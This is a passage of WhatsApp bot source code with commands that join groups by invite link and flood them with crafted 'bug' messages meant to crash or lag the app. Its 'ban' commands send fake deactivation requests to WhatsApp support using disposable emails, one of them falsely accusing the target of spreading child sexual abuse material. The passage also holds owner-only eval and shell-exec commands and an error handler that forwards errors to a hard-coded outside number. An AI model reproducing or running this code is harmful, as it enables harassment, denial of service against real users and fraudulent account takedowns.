"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(aespispgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await ArielStore.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(aespispgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await ArielStore.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(aespispgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(aespispgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await ArielStore.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(aespispgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await ArielStore.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
ArielStore.relayMessage(aespispgc, order.message, { messageId: order.key.id })
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await ArielStore.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = `${aespitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(aespispgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${aespispgc} Please pause for 3 minutes*`)
} 
break

//ban/unban cases
case 'out': case 'verif':{
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'banv1': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'banv2': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'banv3': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'banv4': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'banv5': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'banv6': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'unbanv1': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'unbanv2': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'unbanv3': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'unbanv4': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'unbanv5': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let aespispnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let aespisptesx = await ArielStore.onWhatsApp(aespispnumx)
if (aespisptesx.length == 0) return replygcaespisp(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let aespispxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = aespispxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(aespispxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", aespispnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ArielStore.sendMessage(from, { text: util.format(res.data)}, { quoted: ftroli })
}
break
case 'meng':{
                	let audiobuffy = fs.readFileSync(`./ArielFolder/oke.mp4`)
ArielStore.sendMessage(m.chat, { video: audiobuffy })     
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!aespispTheCreator) return aespispStickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcaespisp(bang)
                    }
                    try {
                        replygcaespisp(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcaespisp(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!aespispTheCreator) return aespispStickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcaespisp(evaled)
                    } catch (err) {
                        await replygcaespisp(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!aespispTheCreator) return aespispStickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcaespisp(err)
                        if (stdout) return replygcaespisp(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
ArielStore.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
ArielStore.sendMessage("6282129009301@s.whatsapp.net", { text: "Makasih Developer https://linktr.ee/arielstore2072" + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
